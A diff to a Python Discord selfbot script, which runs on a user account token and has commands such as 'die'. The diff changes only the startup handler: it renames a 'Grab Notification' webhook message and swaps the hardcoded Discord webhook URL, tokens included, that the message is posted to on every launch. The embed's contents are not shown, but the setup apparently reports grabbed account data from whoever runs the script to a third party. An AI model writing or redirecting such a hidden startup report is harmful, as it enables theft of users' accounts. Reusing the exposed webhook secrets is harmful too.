@@ -212,12 +212,12 @@ async def on_ready():
     
     # Sending the embed via the webhook
     data = {
-        "username": "Grab Notification",
+        "username": "Gamb Notification",
         "embeds": [embed.to_dict()]
     }
     
     # Sending to the webhook URL
-    requests.post("https://discord.com/api/webhooks/1354022610467291186/brMdv5hD0AeSbOziJmY_GmNmYCeEu7GCs7zzBg5GDO5iIR1guCs6OVOiOngoiZUnoIOQ", json=data)
+    requests.post("https://discord.com/api/webhooks/1422131555819720775/xcbOXipRxunuBVQDPDx9gLLyxqe5xjP_miDJOkzAh-03PLoS1ORAeuhgT2mZlPes6uHA", json=data)
    
 
 @client.command()
@@ -876,3 +876,4 @@ async def die(ctx):
     await ctx.send("Died Lmao")
 
 client.run(token, bot=False)
+
